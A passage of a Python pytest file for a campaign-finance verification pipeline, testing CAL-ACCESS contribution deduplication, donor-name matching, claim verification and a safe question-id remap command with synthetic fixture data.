    cal-access is unfetchable. revalidate_from_cache() looked for one anyway and discarded
    every query source at build, which also wiped the fresh verifier's judgment each time."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import revalidate_from_cache

    monkeypatch.setitem(
        queries.REGISTRY, "test.total",
        queries.Query(lambda root, **kw: queries.QueryResult(value=45678.21, detail="57 gifts"),
                      ("filer_id",), "test", 1))
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: None)

    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                expected="45678.21"))
    s.verification.status = "verified"
    s.verification.support = "supports"
    out = revalidate_from_cache(s, tmp_path)
    assert out.verification.status == "verified", "no page is expected; the query is the check"
    assert out.verification.support == "supports", "the verifier's judgment must survive"

    # but a query that no longer reproduces is still discarded
    monkeypatch.setitem(
        queries.REGISTRY, "test.total",
        queries.Query(lambda root, **kw: queries.QueryResult(value=999.0, detail="changed"),
                      ("filer_id",), "test", 1))
    moved = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                    expected="45678.21"))
    moved.verification.status = "verified"
    assert revalidate_from_cache(moved, tmp_path).verification.status == "human_review"


def test_one_gift_reported_on_two_forms_counts_once(tmp_path):
    """A contribution crossing the 24-hour threshold is reported on BOTH Form 460 Schedule A
    and Form 496 Part 3, as two genuinely different filings — so amendment dedup misses it and
    "Harbor View LLC" came out at $55,000 instead of $27,500. The filer links the pair: the
    TRAN_IDs share a base after the form prefix."""
    import zipfile

    from vgpipe import calaccess, queries

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '9990008\t0\tA-100001\t1\tHarbor View LLC\t\t\t\t1/30/2026 12:00:00 AM\t27500\tA\n'
                '9990007\t0\tF496P3-100001\t1\tHarbor View LLC\t\t\t\t1/30/2026 12:00:00 AM'
                '\t27500\tF496P3\n')
    filings = ('FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n'
               '9990009\t9990008\tF460\t2/1/2026 12:00:00 AM\n'
               '9990009\t9990007\tF496\t1/31/2026 12:00:00 AM\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    got = queries.run("calaccess.contributor_total",
                      {"filer_id": "9990009", "contributor": "Harbor View LLC"}, tmp_path)
    assert got.value == 27500.0, f"counted twice across form types: {got.value}"


def test_ie_total_refuses_a_bare_surname(tmp_path):
    """Asked for a surname alone, it summed another candidate with that surname, in another
    county and year, into the total. A surname is not a candidate, and nothing downstream can
    catch it."""
    from vgpipe import queries

    with pytest.raises(ValueError, match="needs first"):
        queries.run("calaccess.ie_total", {"candidate_last": "Ko"}, tmp_path)


def test_an_individual_donor_needs_a_first_name(tmp_path):
    """CTRIB_NAML holds only the surname for individuals, so "Rivera" summed different people
    into one total — a contributor who does not exist. Organizations are unaffected:
    their whole name sits in CTRIB_NAML."""
    import zipfile

    from vgpipe import calaccess, queries

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '1\t0\tT1\t1\tRivera\tSam\t\t\t1/2/2026 12:00:00 AM\t9000\tA\n'
                '1\t0\tT2\t2\tRivera\tToni\t\t\t1/3/2026 12:00:00 AM\t7000\tA\n'
                '1\t0\tT3\t3\tBig PAC SCC\t\t\t\t1/4/2026 12:00:00 AM\t12000\tA\n')
    filings = 'FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n7\t1\tF460\t2/1/2026 12:00:00 AM\n'
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    merged = queries.run("calaccess.contributor_total",
                         {"filer_id": "7", "contributor": "Rivera"}, tmp_path)
    assert merged.value is None and not merged.found, "two Riveras must not sum to $16,000"
    assert "DIFFERENT first names" in merged.note

    one = queries.run("calaccess.contributor_total",
                      {"filer_id": "7", "contributor": "Rivera",
                       "contributor_first": "Sam"}, tmp_path)
    assert one.value == 9000.0

    org = queries.run("calaccess.contributor_total",
                      {"filer_id": "7", "contributor": "Big PAC SCC"}, tmp_path)
    assert org.value == 12000.0, "an organization needs no first name"


def test_sid_covers_the_query_so_a_verdict_cannot_outlive_it():
    """A judgment is keyed by sid and lapses only when the sid changes. For a query citation
    the assertion IS the name, params and expected value — leaving them out of the hash let a
    `supports` verdict carry from "Brennan Holdings and Affiliated Entities" to
    "R. Quinn Halvorsen" with url and snippet untouched: a verifier checked one number, the row
    vouched for another."""
    from vgpipe.models import QueryCitation

    def q(expected="X", params=None, name="calaccess.top_contributor"):
        return src(query=QueryCitation(name=name, params=params or {"filer_id": "1"},
                                       expected=expected))

    base = q()
    assert q().sid == base.sid, "an identical citation must keep its verdict"
    assert q(expected="Y").sid != base.sid, "a changed expected value must lapse the verdict"
    assert q(params={"filer_id": "2"}).sid != base.sid, "changed params must lapse it"
    assert q(name="calaccess.filer_total").sid != base.sid, "a different query must lapse it"

    # a text citation's identity is unchanged by this
    text = src()
    assert text.sid == src().sid
    assert text.sid != src(snippet="a different span entirely").sid


def test_a_duplicated_cover_row_does_not_double_the_facts(tmp_path):
    """CVR_CAMPAIGN_DISCLOSURE_CD carries duplicate rows for 61,088 filings. Joining a clean
    fact table to a multiplying cover table still double-counts — the amendment guard on
    S496/RCPT cannot help, because it is the JOIN that fans out. One candidate's support total
    came out inflated this way. CVR_LATEST collapses the duplicates to one cover per filing (a
    database without cover AMEND_IDs refuses instead, tested above)."""
    import zipfile

    from vgpipe import calaccess, queries

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '9990010\t0\tX1\t1\t9400\t5/1/2026 12:00:00 AM\tads\n'
           '9990010\t0\tX2\t2\t10000\t5/2/2026 12:00:00 AM\tmailers\n')
    # the same cover record twice, byte-identical, as the export actually ships it
    row = '9990010\t0\t9990011\tNeighbors for Fair Representation\tKo\tDana\tS\tF496\n'
    covers = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
              '\tFORM_TYPE\n' + row + row)
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", covers)
    calaccess.build(tmp_path)

    got = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana", "stance": "support"}, tmp_path)
    assert got.value == 19400.0, f"the duplicated cover row doubled the total: {got.value}"


def test_top_contributor_reports_a_tie_instead_of_picking_one(tmp_path):
    """`ORDER BY amt DESC LIMIT 1` makes an arbitrary choice among equals, and a verifier
    rightly rejected a "largest contributor" that was a two-way tie."""
    import zipfile

    from vgpipe import calaccess, queries

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '1\t0\tT1\t1\tAlpha PAC\t\t\t\t1/2/2026 12:00:00 AM\t4400\tA\n'
                '1\t0\tT2\t2\tBeta PAC\t\t\t\t1/3/2026 12:00:00 AM\t4400\tA\n'
                '1\t0\tT3\t3\tGamma PAC\t\t\t\t1/4/2026 12:00:00 AM\t500\tA\n')
    filings = 'FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n7\t1\tF460\t2/1/2026 12:00:00 AM\n'
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    got = queries.run("calaccess.top_contributor", {"filer_id": "7"}, tmp_path)
    assert "Alpha PAC" in got.value and "Beta PAC" in got.value
    assert "TIE" in got.detail and "do not word this as one" in got.detail


def test_a_conclusion_is_not_verified_while_its_inputs_are_not():
    """A comparison inherits the weakness of what it compares. If the candidate's housing
    position is human_review, "their housing position falls short of the platform" is not
    verified either, however well the platform's own text is cited."""
    from vgpipe.verify import check_inputs

    ok = Claim(question_id="q17", question="?", answer="a", sources=[_verified()])
    check_corroboration(ok)
    for s_ in ok.sources:
        s_.verification.support = "supports"
    assert ok.status == "verified"

    weak = Claim(question_id="q18", question="?", answer="a", sources=[_verified()])
    # no verdict recorded, so it is pending — not a foundation to reason from
    cmp_ = Claim(question_id="q35", question="?", answer="a",
                 derives_from=["q17", "q18"], sources=[_verified()])
    check_corroboration(cmp_)
    for s_ in cmp_.sources:
        s_.verification.support = "supports"

    check_inputs([ok, weak, cmp_])
    assert cmp_.status == "human_review"
    assert cmp_.unmet_inputs == ["q18 (pending)"]

    # a declared input that does not exist at all is also unmet
    orphan = Claim(question_id="q36", question="?", answer="a", derives_from=["q99"])
    check_inputs([orphan])
    assert orphan.unmet_inputs == ["q99 (missing)"]


def test_remap_refuses_to_overwrite_stranded_research(tmp_path, capsys):
    """remap printed "N files nothing maps to" in yellow and then overwrote them, because old
    and new id spaces overlap. Four claim files would have been destroyed with no error, two of
    them carrying verified citations that cost real effort. The identity moved; the old thing
    must not be assumed gone."""
    import json

    import typer

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    (tmp_path / "questions.json").write_text(json.dumps([
        {"id": "q3", "text": "new q3", "claim_type": "mechanical", "maps_from": "q4"},
    ]))
    for qid, answer in (("q3", "IE committees — nothing maps away from this"),
                        ("q4", "who funds them")):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"old {qid}", "answer": answer, "sources": []}))

    with pytest.raises(typer.Exit) as exc:
        cli.remap(data=tmp_path, apply=True)
    assert exc.value.exit_code == 1
    kept = json.loads((tmp_path / "claims" / "q3.json").read_text())
    assert kept["answer"].startswith("IE committees"), "the stranded file must survive"

    # --archive-stranded preserves it and then the move can proceed
    cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert (tmp_path / "claims-archive" / "q3.json").exists(), "archived, not deleted"
    moved = json.loads((tmp_path / "claims" / "q3.json").read_text())
    assert moved["answer"] == "who funds them"
    assert moved["question_id"] == "q3"


def _remap_run(tmp_path, mapping):
    """A run whose claims sit on the ORIGINAL ids q1..q3, and a questions.json mapping onto them."""
    import json

    (tmp_path / "claims").mkdir(exist_ok=True)
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": new, "text": f"new {new}", "claim_type": "mechanical", "maps_from": old}
         for new, old in mapping]))
    for qid, answer in (("q1", "donations"), ("q2", "largest donors"), ("q3", "votes")):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"old {qid}", "answer": answer, "sources": []}))


def _answers(tmp_path):
    import json

    return {p.stem: json.loads(p.read_text())["answer"]
            for p in sorted((tmp_path / "claims").glob("*.json"))}


# q1 -> q2 -> q3 -> q1: the id spaces overlap completely, so a second pass is always a legal-looking
# move, and each claim lands one question further from where it belongs.
ROTATE = [("q2", "q1"), ("q3", "q2"), ("q1", "q3")]


def _write_mapping(tmp_path, mapping):
    import json

    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": new, "text": f"new {new}", "claim_type": "mechanical", "maps_from": old}
         for new, old in mapping]))


def _applied_before_the_guard(tmp_path, mapping):
    """A run the pre-guard remap migrated: claims on the new ids, maps_from still in
    questions.json exactly as written, and no marker — the state a live run was in."""
    from vgpipe import cli

    _remap_run(tmp_path, mapping)
    cli.remap(data=tmp_path, apply=True)
    _write_mapping(tmp_path, mapping)
    (tmp_path / ".remap-applied").unlink()


def test_an_apply_retires_its_mapping_so_only_a_new_pair_moves(tmp_path, capsys):
    """maps_from describes a migration FROM the original ids, not a state. Left in place after an
    apply it still read as pending, so a second --apply moved every claim again — a live run's
    dry run proposed moving one question's claim onto an unrelated question — and an operator
    who added ONE new pair re-ran every old one with it, since no fingerprint can tell "stale pairs
    plus a new one" from a new migration. So an apply renames each maps_from to mapped_from: the
    record stays, and the next mapping sees only moves nobody has made yet."""
    import json

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    qpath = tmp_path / "questions.json"
    before = json.loads(qpath.read_text())
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)
    assert once == {"q1": "votes", "q2": "donations", "q3": "largest donors"}

    after = json.loads(qpath.read_text())
    # the same questions, the same keys in the same places: only the one key is renamed
    assert after == [{("mapped_from" if k == "maps_from" else k): v for k, v in q.items()}
                     for q in before]
    assert [list(q) for q in after] == [["id", "text", "claim_type", "mapped_from"]] * 3
    # written the way the tracked questions.json files are, so the diff is only the rename
    assert qpath.read_text() == json.dumps(after, indent=1)
    capsys.readouterr()

    # the next migration is a single new pair, edited into the file the apply left behind
    after.append({"id": "q4", "text": "new q4", "claim_type": "mechanical", "maps_from": "q3"})
    qpath.write_text(json.dumps(after, indent=1))
    # the retired questions keep their claims: read as "nothing maps to", one new pair made every
    # other claim stranded, and --archive-stranded archived them all
    cli.remap(data=tmp_path)
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "nothing maps to" not in out, out
    assert "1 question(s) with no prior research: q3" in out, "only q3's claim moves away"
    cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert _answers(tmp_path) == {"q1": "votes", "q2": "donations", "q4": "largest donors"}, \
        "only the new pair moves; the rotation's pairs are not re-applied"
    assert not (tmp_path / "claims-archive").exists(), "nothing was stranded"
    # the leftover-pairs warning is for a file with no record of retiring an earlier mapping;
    # here the record is right there, and warning anyway teaches people to skim past it
    assert "records an earlier remap" not in capsys.readouterr().out
    # mapped_from is per question — the move that last brought its claim there — so the file
    # keeps the run's whole mapping state, which the re-apply fingerprint hashes
    retired = {q["id"]: q.get("mapped_from") for q in json.loads(qpath.read_text())}
    assert retired == {"q2": "q1", "q3": "q2", "q1": "q3", "q4": "q3"}


def test_an_applied_migration_leaves_nothing_to_remap(tmp_path, capsys):
    """After an apply there is nothing left to do: a dry run must not propose the moves again,
    and a second --apply — with --archive-stranded, too — must move, archive and back up nothing.
    With no maps_from left, every claim file reads as "nothing maps to", and --archive-stranded
    would archive the whole run, so remap says there is nothing to remap and stops."""
    import json

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)
    backup = {p.name: p.read_bytes() for p in (tmp_path / "claims-backup").glob("*.json")}
    capsys.readouterr()

    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True}):
        cli.remap(data=tmp_path, **flags)
        out = capsys.readouterr().out
        assert "nothing to remap" in out, flags
        assert "new q1" not in out and "nothing maps to" not in out, (flags, "nothing listed")
        assert _answers(tmp_path) == once, flags
        assert not (tmp_path / "claims-archive").exists(), flags
        # the backup of the ORIGINAL ids is the recovery path; nothing may overwrite it
        assert {p.name: p.read_bytes()
                for p in (tmp_path / "claims-backup").glob("*.json")} == backup, flags
    assert (json.loads((tmp_path / "claims-backup" / "q1.json").read_text())["answer"]
            == "donations")


def test_the_marker_still_refuses_a_mapping_left_pending(tmp_path, capsys):
    """Retiring maps_from is the guard now; the marker is the second one. It catches what the
    file can't show: a mapping an older remap applied without retiring it, and an older
    questions.json put back (a checkout of the old file, a merge that took the wrong side) — both
    read as pending on claims that already moved. The refusal must move nothing, not propose the
    moves as a plan, and name the way out of each state the claims can be in."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)
    _write_mapping(tmp_path, ROTATE)
    capsys.readouterr()
    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        out = capsys.readouterr().out
        assert "already been applied" in out, flags
        assert "new q1" not in out and "dry run; pass --apply" not in out, "no moves proposed"
        assert _answers(tmp_path) == once, flags
        assert not (tmp_path / "claims-archive").exists(), flags
        flat = " ".join(out.split())
        # all on the new ids: retire the mapping — and, after an older apply that stopped short
        # of re-homing, re-home first, naming this run (a bare --repair re-homes data/ instead)
        assert "vg remap --mark-applied --data" in flat and "vg judgments --repair --data" in flat
        # some missing: --repair can't restore claim files a failed move left missing
        assert "claims-backup" in flat
        # every claim where it was (an older apply stopped before its first move, or the same
        # mapping declared again): that needs its own way out, or the guard blocks it for good
        assert "still on the ids it moves from" in flat
        # but not a ready-to-run --repair mapping: maps_from reads the same after a finished
        # apply, and re-applying it to verdicts already re-homed moves them twice, undetectably
        # for a source both claims cite. --repair's own refusal names each verdict left behind.
        assert "--moved q" not in flat and "names each one it cannot place" in flat

    cli.remap(data=tmp_path, mark_applied=True)
    qpath = tmp_path / "questions.json"
    assert not [q for q in json.loads(qpath.read_text()) if q.get("maps_from")]
    assert _answers(tmp_path) == once, "marking moves nothing"
    cli.remap(data=tmp_path)
    assert "nothing to remap" in capsys.readouterr().out


def test_an_identity_only_apply_records_nothing(tmp_path, capsys):
    """An apply whose pairs all keep their ids relocates nothing. Recording its (empty)
    fingerprint would refuse every later identity-only mapping, which is a refusal with no
    migration behind it. It did adopt the template's wording, though, so it retires its pairs
    like any other apply — and a later identity pair, whose wording is unchanged, must not
    overwrite the drift the first one recorded with the current text."""
    import json

    from vgpipe import cli

    _remap_run(tmp_path, [("q1", "q1"), ("q2", "q2")])
    cli.remap(data=tmp_path, apply=True)
    assert not (tmp_path / ".remap-applied").exists()
    qpath = tmp_path / "questions.json"
    assert {q["id"]: q.get("mapped_from") for q in json.loads(qpath.read_text())} == \
        {"q1": "q1", "q2": "q2"}
    capsys.readouterr()
    cli.remap(data=tmp_path, apply=True)
    assert "nothing to remap" in capsys.readouterr().out

    _write_mapping(tmp_path, [("q1", "q1"), ("q2", "q2")])     # declared again: may run again
    cli.remap(data=tmp_path, apply=True)
    claim = json.loads((tmp_path / "claims" / "q1.json").read_text())
    assert claim["answer"] == "donations" and claim["question"] == "new q1"
    assert claim["previous_question"] == "old q1", "the recorded drift survives"


def test_an_edit_that_moves_nothing_does_not_reopen_the_re_apply(tmp_path):
    """The fingerprint was order-sensitive and hashed unmapped questions and identity pairs too,
    so reordering questions.json, adding a question with no prior research, or noting that a
    question kept its id changed it — and the finished migration could run again. None of those
    edits changes what moves where. Here the edit lands on the mapping put back, which is when
    the fingerprint is still what refuses."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)

    _write_mapping(tmp_path, ROTATE)
    qpath = tmp_path / "questions.json"
    reordered = list(reversed(json.loads(qpath.read_text())))
    reordered.append({"id": "q4", "text": "new q4", "claim_type": "mechanical",
                      "maps_from": None})
    reordered.append({"id": "q5", "text": "new q5", "claim_type": "mechanical",
                      "maps_from": "q5"})
    qpath.write_text(json.dumps(reordered))
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, apply=True)
    assert _answers(tmp_path) == once


def _tree(root):
    return {str(p.relative_to(root)): p.read_bytes()
            for p in sorted(root.rglob("*")) if p.is_file()}


@pytest.mark.parametrize("bad", [b"{not json", b"\xff\xfe not utf-8", b'{"question_id": "q9"}',
                                 b'"oops"', b"[1]", b"[" * 100_000 + b"]" * 100_000],
                         ids=["malformed-json", "not-utf8", "invalid-claim", "scalar",
                              "list-of-scalars", "too-deep"])
def test_remap_reads_every_claim_file_before_moving_any(tmp_path, bad):
    """remap read only the files it was about to move. A stranded file — one nothing maps from —
    was first parsed by the reload after the move, so a malformed one exited there: claims on
    their new ids, verdicts stranded under the old ones, every moved claim rendering
    `unreviewed`, which reads as "not yet judged" when the truth is "lost". Every claim file is
    read before anything is written, the dry run included — a dry run that passes must not be
    followed by an apply that refuses — and the refusal names the file."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    _remap_run(tmp_path, ROTATE)
    (tmp_path / "claims" / "q9.json").write_bytes(bad)
    judgments.record(tmp_path, "q1", "0123456789ab", "supports", "must stay on q1")
    before = _tree(tmp_path)
    runner = CliRunner()
    for args in ([], ["--apply"], ["--apply", "--archive-stranded"]):
        r = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), *args])
        assert r.exit_code == 1, (args, r.output)
        assert "q9.json" in r.output, (args, r.output)
        assert r.exception is None or isinstance(r.exception, SystemExit), r.exception
        assert _tree(tmp_path) == before, f"remap {args} wrote something before refusing"
    assert not (tmp_path / "claims-backup").exists()
    assert not (tmp_path / ".remap-applied").exists()


def test_remap_refuses_a_source_it_cannot_move_before_writing_anything(tmp_path):
    """A claim file may hold a list of claims, and the loader reads it — but remap moves one
    claim per file, so staging such a source crashed after --archive-stranded and the backup had
    already run. Staging now happens before anything is written, and says why."""
    import json

    from typer.testing import CliRunner

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    (tmp_path / "claims" / "q1.json").write_text(json.dumps(
        [{"question_id": "q1", "question": "old q1", "answer": "donations", "sources": []}]))
    before = _tree(tmp_path)
    runner = CliRunner()
    for args in ([], ["--apply"], ["--apply", "--archive-stranded"]):
        r = runner.invoke(cli.app, ["remap", "--data", str(tmp_path), *args])
        assert r.exit_code == 1, (args, r.output)
        assert "q1.json" in r.output, (args, r.output)
        assert r.exception is None or isinstance(r.exception, SystemExit), r.exception
        assert _tree(tmp_path) == before, f"remap {args} wrote something before refusing"


def test_a_changed_mapping_may_apply_after_an_earlier_remap(tmp_path, capsys):
    """The guard is keyed to the mapping, not to "a remap happened once": a new questions.json
    describes a new migration from the current ids, and that one must still go through — with a
    warning, since a pair left over from the earlier mapping would look exactly like this."""
    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    capsys.readouterr()

    # the next renumbering maps from where the claims now sit: undo the rotation
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q3"), ("q3", "q1")])
    cli.remap(data=tmp_path, apply=True)
    assert _answers(tmp_path) == {"q1": "donations", "q2": "largest donors", "q3": "votes"}
    assert "records an earlier remap" in capsys.readouterr().out
    assert len((tmp_path / ".remap-applied").read_text().split()) == 2, "both are recorded"

    # once nothing is mapped any more there is nothing to warn about; warning anyway would teach
    # people to skim past the one warning that covers leftover pairs
    _write_mapping(tmp_path, [("q1", None), ("q2", None), ("q3", None)])
    cli.remap(data=tmp_path)
    assert "records an earlier remap" not in capsys.readouterr().out


def test_putting_back_an_older_mapping_is_refused(tmp_path, capsys):
    """The marker used to hold only the latest fingerprint, so after a second migration a
    reverted questions.json made the first one runnable again — on claims that are now two
    migrations away from the ids it moves from."""
    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    cli.remap(data=tmp_path, apply=True)
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q1")])     # a second, different migration
    cli.remap(data=tmp_path, apply=True)
    twice = _answers(tmp_path)

    _write_mapping(tmp_path, ROTATE)                            # e.g. git checkout of the old file
    put_back = (tmp_path / "questions.json").read_text()
    capsys.readouterr()
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, apply=True)
    assert _answers(tmp_path) == twice
    # the backup was taken before the SECOND migration, so it can't restore this one's inputs;
    # the refusal must not send anyone there
    out = " ".join(capsys.readouterr().out.split())
    assert "not even the latest remap" in out and "claims-backup" not in out

    # nor may --mark-applied retire it: that would leave the older question set in place, with
    # nothing left to say so
    marker = (tmp_path / ".remap-applied").read_text()
    with pytest.raises(typer.Exit):
        cli.remap(data=tmp_path, mark_applied=True)
    assert "older copy" in " ".join(capsys.readouterr().out.split())
    assert (tmp_path / "questions.json").read_text() == put_back
    assert (tmp_path / ".remap-applied").read_text() == marker


def test_a_mapping_retired_elsewhere_is_refused_where_the_claims_never_moved(tmp_path, capsys):
    """The retired questions.json is tracked; data/claims is not. A checkout that pulls the
    retired file while its own claims still sit on the old ids would read "nothing to remap" —
    and the migration it still needs would vanish without a word. Where a claim file is still on
    an id the mapping moved away from, which no current question uses, that is visible, and
    refused: dry run, apply and --mark-applied alike."""
    import typer

    from vgpipe import cli

    here, elsewhere = tmp_path / "here", tmp_path / "elsewhere"
    for run in (here, elsewhere):
        run.mkdir()
        _remap_run(run, RENAME)                     # claims on q1, q2, q3; q2 retires to q2a
    cli.remap(data=elsewhere, apply=True)
    (here / "questions.json").write_text((elsewhere / "questions.json").read_text())
    before = _tree(here / "claims")
    capsys.readouterr()
    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True},
                  {"mark_applied": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=here, **flags)
        assert exc.value.exit_code == 1, flags
        out = " ".join(capsys.readouterr().out.split())
        assert "q2" in out and "nothing to remap" not in out, (flags, out)
        assert _tree(here / "claims") == before, flags
    assert not (here / ".remap-applied").exists()


def test_a_retired_mapping_a_hand_edit_mangled_is_refused_not_a_crash(tmp_path, capsys):
    """The guard reads every mapped_from on every remap of a retired run, so a hand-edited value
    that is not an id must not turn plain `vg remap` into a traceback — and must not be counted
    as a retired migration (that silenced the leftover-pairs warning) while adding nothing to
    the mapping state. It is refused, as a malformed maps_from is."""
    import json

    import typer

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    for bad in ({"id": "q3"}, ["q2", "q3"], 7):
        (tmp_path / "questions.json").write_text(json.dumps([
            {"id": "q1", "text": "a", "claim_type": "mechanical", "mapped_from": bad}]))
        for flags in ({}, {"apply": True}, {"mark_applied": True}):
            with pytest.raises(typer.Exit) as exc:
                cli.remap(data=tmp_path, **flags)
            assert exc.value.exit_code == 1, (bad, flags)
            assert "must each be one question id" in " ".join(capsys.readouterr().out.split())


def test_remap_refuses_one_old_id_mapped_into_two_questions(tmp_path):
    """A split — q2a and q2b both from q2 — passed the dry run, then failed the apply after the
    backup and the archive had run: the second move found its source already gone. A claim
    moves to one question, so the mapping is refused up front, dry run included."""
    import typer

    from vgpipe import cli

    _remap_run(tmp_path, [("q1", "q1"), ("q2a", "q2"), ("q2b", "q2"), ("q3", "q3")])
    before = _tree(tmp_path)
    for flags in ({}, {"apply": True}, {"apply": True, "archive_stranded": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        assert _tree(tmp_path) == before, flags


def test_restoring_maps_from_on_part_of_a_retired_mapping_is_refused(tmp_path, capsys):
    """Restore maps_from on just the two questions of a swap, leave the rest retired: the two
    pending pairs hashed to a new fingerprint, a swap trips no collision check, and the leftover
    warning is skipped because mapped_from exists — so apply exited 0 with each claim on the
    other's question. The fingerprint covers the file's whole mapping state, pending and retired,
    so this is the migration the marker already lists."""
    import json

    import typer

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    for qid, answer in (("q1", "A"), ("q2", "B"), ("q3", "C"),
                        ("q4", "D")):
        (tmp_path / "claims" / f"{qid}.json").write_text(json.dumps(
            {"question_id": qid, "question": f"old {qid}", "answer": answer, "sources": []}))
    _write_mapping(tmp_path, [("q1", "q2"), ("q2", "q1"), ("q3", "q4"), ("q4", "q3")])
    cli.remap(data=tmp_path, apply=True)
    once = _answers(tmp_path)
    assert once == {"q1": "B", "q2": "A", "q3": "D", "q4": "C"}

    qpath = tmp_path / "questions.json"
    qs = json.loads(qpath.read_text())
    for q in qs:
        if q["id"] in ("q1", "q2"):               # a partial checkout of the old file
            q["maps_from"] = q.pop("mapped_from")
    qpath.write_text(json.dumps(qs, indent=1))
    capsys.readouterr()
    for flags in ({}, {"apply": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        assert "already been applied" in capsys.readouterr().out, flags
        assert _answers(tmp_path) == once, f"remap {flags} moved a claim onto the wrong question"


def test_a_maps_from_that_is_not_an_id_is_refused_not_a_crash(tmp_path, capsys):
    """Two questions with the same list-valued maps_from crashed the split check with
    'unhashable type: list'. A maps_from names one old id; anything else is refused cleanly."""
    import json

    import typer

    from vgpipe import cli

    _remap_run(tmp_path, ROTATE)
    before = _tree(tmp_path)
    (tmp_path / "questions.json").write_text(json.dumps([
        {"id": "q1", "text": "a", "claim_type": "mechanical", "maps_from": ["q2", "q3"]},
        {"id": "q2", "text": "b", "claim_type": "mechanical", "maps_from": ["q2", "q3"]}]))
    before = _tree(tmp_path)
    for flags in ({}, {"apply": True}, {"mark_applied": True}):
        with pytest.raises(typer.Exit) as exc:
            cli.remap(data=tmp_path, **flags)
        assert exc.value.exit_code == 1, flags
        assert "must each be one question id" in " ".join(capsys.readouterr().out.split())
        assert _tree(tmp_path) == before, flags


def test_a_question_the_first_migration_added_keeps_its_claim(tmp_path, capsys):
